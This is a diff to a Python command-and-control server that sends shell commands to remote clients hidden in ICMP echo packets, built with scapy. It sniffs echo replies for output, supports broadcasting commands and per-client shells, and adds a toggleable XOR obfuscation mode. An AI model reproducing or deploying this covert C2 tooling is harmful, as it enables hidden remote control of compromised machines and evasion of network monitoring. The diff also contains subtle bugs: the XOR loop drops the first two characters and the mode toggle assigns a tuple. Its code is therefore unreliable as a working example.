@@ -6,6 +6,8 @@ import threading
 DEBUG = True                   # Set to display statements after command execution
 DEVDEBUG = False               # Set to display statements specific to debugging issues
 JSONFILE = "example.json"      # Set to point to configuration files with loadclients
+global SuperSecretMode         # Enables "encryption"
+KEY = "B"
 
 def print_title(): 
     print(".__                          ___             .__.__    ___") 
@@ -27,6 +29,7 @@ def print_help():
     print("\tloadclients              Loads all clients specified in JSONFILE")
     print("\tshell <ID>               Creates a direct line with client at ID")
     print("\tkill                     Stops server")
+    print("\tssm                      Enables Super Secret Mode")                    
     print("\thelp                     Prints this")
 
 # Add clients to the dictionary of clients, the IP from arguments, and the id
@@ -74,19 +77,37 @@ def send_command(arguments, clients, execute):
             segments = len(clienttokens[1].encode('utf-8'))//1469
             if DEVDEBUG: print(segments)
             send_over_icmp(clients.get(int(clienttokens[0])), clienttokens[1], execute)
-            if DEBUG: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))}")
+            if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))} (Super Secretly)")
+            if DEBUG and not SuperSecretMode: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))}")
         else:
             print(f"[ERROR] No client at ID {clienttokens[0]}")
     except:
         print("[ERROR] Usage: send <ID> <message>")
 
+def encrypt(plaintext):
+    encrypted = "!!!"  
+    for i in range(2,len(plaintext)):
+        encrypted += chr(ord(plaintext[i]) ^ ord(KEY)) 
+    return encrypted
+
 # Reduced redundency in options
 def send_over_icmp(clientip, command, execute):
     if execute:
-        clientcommand = "!!!" + command        
+        if SuperSecretMode:
+            clientcommand = "!!!$1" + command
+        else:
+            clientcommand = "!!!01" + command         
     else:
-        clientcommand = "!!!_" + command
-    evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
+        if SuperSecretMode:
+            clientcommand = "!!!$0" + command
+        else:
+            clientcommand = "!!!00" + command
+
+    if SuperSecretMode: 
+        encrypted = encrypt(clientcommand)
+        evil = IP(dst=clientip)/ICMP(type=8)/(encrypted)
+    else:
+        evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
     send(evil)
 
 # Send command to all clients
@@ -96,6 +117,7 @@ def sendtoall(arguments, clients, execute):
     else:
         for client in clients:
             send_over_icmp(clients.get(client), arguments[1], execute)
+            if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
             if DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
 
 # Place icupS into single client mode
@@ -135,22 +157,23 @@ def listen(pkt):
     src = pkt[IP].dst 
     payload = str(pkt.payload)
     parsed = re.split('#{3}', payload)
+    
     if len(parsed) == 1:
         return
     else:
         command = parsed[1][:-1]
-        command.removeprefix("b\'")
-        command.removesuffix("\\\\n\'")
-        print(f"Recieved:\n\t{command}\nfrom {src}")
+        print(f"Recieved:\n\t{command} from {src}")
 
 def sniffer():
     sniff(filter="icmp[icmptype] == icmp-echoreply", prn=listen)
 
 def main():
+    global SuperSecretMode
     print_title()
     print("Enter command to begin, or \"help\" for help:")
     threading.Thread(target=sniffer, daemon=True).start()
     clients = dict()
+    SuperSecretMode = False
     id = 0
     while(True):
         command = input(">> ")
@@ -186,6 +209,9 @@ def main():
         elif arguments[0] == "kill":
             print_title()
             break
+        elif arguments[0] == "ssm":
+            if SuperSecretMode: SuperSecretMode = False, print("SSM Disabled")
+            else: SuperSecretMode = True, print("SSM Enabled")
         elif arguments[0] == "help":
             print_help()
         else:
